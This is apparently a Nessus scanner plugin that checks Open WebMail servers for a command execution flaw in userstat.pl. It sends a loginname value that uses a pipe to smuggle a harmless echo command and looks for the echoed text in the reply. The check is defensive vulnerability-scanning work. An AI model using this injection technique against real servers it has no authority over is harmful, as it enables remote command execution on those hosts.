#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

# Changes by Tenable:
# - Added OSVDB ref, changed family (8/6/09)


include("compat.inc");

if (description) {
  script_id(15529);
  script_version("$Revision: 1.8 $");

# script_cve_id("CVE-MAP-NOMATCH");
# NOTE: no CVE id assigned (gat, 10/2004)
  script_bugtraq_id(10316);
  script_osvdb_id(4201);

  script_name(english:"Open WebMail userstat.pl Arbitrary Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary commands may be run on the remote host." );
 script_set_attribute(attribute:"description", value:
"The target is running at least one instance of Open WebMail in which
the userstat.pl component fails to sufficiently validate user input. 
This failure enables remote attackers to execute arbitrary programs on
the target using the privileges under which the web server operates. 
For further information, see :

  http://www.openwebmail.org/openwebmail/download/cert/advisories/SA-04:01.txt" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Open WebMail version 2.30 20040127 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2004/10/21");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/01/27");
 script_cvs_date("$Date: 2011/03/17 01:57:39 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_summary(english:"Checks for Arbitrary Command Execution flaw in Open WebMail's userstat.pl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2004-2011 George A. Theall");
  script_family(english:"CGI abuses");
  script_dependencie("global_settings.nasl", "openwebmail_detect.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

host = get_host_name();
port = get_http_port(default:80);

if (!get_port_state(port)) exit(0);
if (debug_level) display("debug: checking for Arbitrary Command Execution flaw in userstat.pl in Open WebMail on ", host, ":", port, ".\n");

# We test whether the hole exists by trying to echo magic (urlencoded
# as alt_magic for http) and checking whether we get it back.
magic = "userstat.pl is vulnerable";
alt_magic = str_replace(string:magic, find:" ", replace:"%20");

# Check each installed instance, stopping if we find a vulnerability.
installs = get_kb_list(string("www/", port, "/openwebmail"));
if (isnull(installs)) exit(0);
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    ver = matches[1];
    dir = matches[2];
    if (debug_level) display("debug: checking version ", ver, " under ", dir, ".\n");

    # nb: more interesting exploits are certainly possible, but my
    #     concern is in verifying whether the flaw exists and by
    #     echoing magic along with the phrase "has mail" I can
    #     do that.
    url = string(
      dir, 
      "/userstat.pl?loginname=|echo%20'",
      alt_magic,
      "%20has%20mail'"
    );
    if (debug_level) display("debug: retrieving ", url, "...\n");
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req);
    if (isnull(res)) exit(0);           # can't connect
    if (debug_level) display("debug: res =>>", res, "<<\n");

    if (egrep(string:res, pattern:magic)) {
      security_hole(port);
      exit(0);
    }
  }
}
